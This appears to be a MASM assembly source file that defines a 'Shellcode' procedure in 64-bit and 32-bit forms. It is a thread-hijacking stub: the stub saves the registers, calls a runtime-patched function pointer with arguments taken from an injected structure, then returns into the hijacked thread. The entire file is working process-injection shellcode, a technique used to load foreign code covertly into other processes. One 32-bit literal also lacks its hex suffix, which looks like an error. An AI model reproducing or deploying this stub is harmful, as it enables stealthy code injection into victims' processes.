IFDEF RAX
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 64 - bit ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.code

Shellcode PROC
    sub rsp, 8
    mov dword ptr [rsp], 0CCCCCCCCh
    mov dword ptr [rsp+4], 0CCCCCCCCh

    ; SAVING THE REGISTERS
	pushfq
	push rax
    push rcx
    push rdx
    push rbx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    ; SAVING THE REGISTERS

    mov rax, 0CCCCCCCCCCCCCCCCh
    sub rsp, 8
    mov qword ptr[rsp], rax
    xor rcx, rcx
    lea rdx, qword ptr[rax + 8h]
    lea r8, qword ptr[rax + 1Ch]
    xor r9, r9
    sub rsp, 08h
    call qword ptr[rax]
    add rsp, 08h
    mov rax, qword ptr[rsp]
    mov qword ptr[rax], 0h
    add rsp, 8
    
    ; RESTORING THE REGISTERS
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    pop rdx
    pop rcx
    pop rax
	popfq
    ; RESTORING THE REGISTERS

    ret
Shellcode ENDP

ELSE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 32 - bit ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.386P
.MODEL FLAT, C

.CODE

Shellcode PROC
    push 0CCCCCCCCh ; Dummy instruction, address will be changed on runtime.

    ; SAVING THE REGISTERS
    pushfd
    pushad
    ; SAVING THE REGISTERS

    mov eax, 0CCCCCCCC
    xor ecx, ecx
    push ecx
    lea ecx, dword ptr[eax + 18h]
    push ecx
    lea ecx, dword ptr[eax + 4h]
    push ecx
    call dword ptr[eax]

    ; RESTORING THE REGISTERS
    popad
    popfd
    ; RESTORING THE REGISTERS

    ret
Shellcode ENDP

ENDIF

END